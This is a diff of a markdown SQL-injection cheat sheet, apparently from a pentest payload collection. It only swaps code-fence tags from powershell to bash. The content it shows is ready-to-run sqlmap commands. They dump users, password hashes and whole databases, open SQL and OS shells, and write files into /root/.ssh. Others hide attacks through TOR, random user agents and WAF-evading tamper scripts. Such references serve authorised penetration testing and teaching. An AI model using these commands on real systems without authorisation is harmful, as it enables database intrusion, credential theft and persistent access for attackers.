@@ -103,33 +103,33 @@ transformed into U+0027 APOSTROPHE (')
 
 ### Basic arguments for SQLmap
 
-```powershell
+```bash
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
 
 ### Load a request file and use mobile user-agent
 
-```powershell
+```bash
 sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
 ```
 
 ### Custom injection in UserAgent/Header/Referer/Cookie
 
-```powershell
+```bash
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
 The injection is located at the '*'
 ```
 
 ### Second order injection
 
-```powershell
+```bash
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
 ### Shell
 
-```powershell
+```bash
 SQL Shell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
 
@@ -145,7 +145,7 @@ python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_
 
 ### Crawl a website with SQLmap and auto-exploit
 
-```powershell
+```bash
 sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
 
 --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
@@ -155,36 +155,36 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 
 ### Using TOR with SQLmap
 
-```powershell
+```bash
 sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
 ```
 
 ### Using a proxy with SQLmap
 
-```powershell
+```bash
 sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
 ```
 
 ### Using Chrome cookie and a Proxy
 
-```powershell
+```bash
 sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
 ```
 
 ### Using suffix to tamper the injection
 
-```powershell
+```bash
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
 
 ### General tamper option and tamper's list
 
-```powershell
+```bash
 tamper=name_of_the_tamper
 ```
 
-```
+```bash
 | Tamper | Description |
 | ------------- | ------------- |
 | 0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
@@ -251,7 +251,7 @@ tamper=name_of_the_tamper
 
 You can use SQLmap to access a database via its port instead of a URL.
 
-```ps1
+```bash
 sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
 ```
 
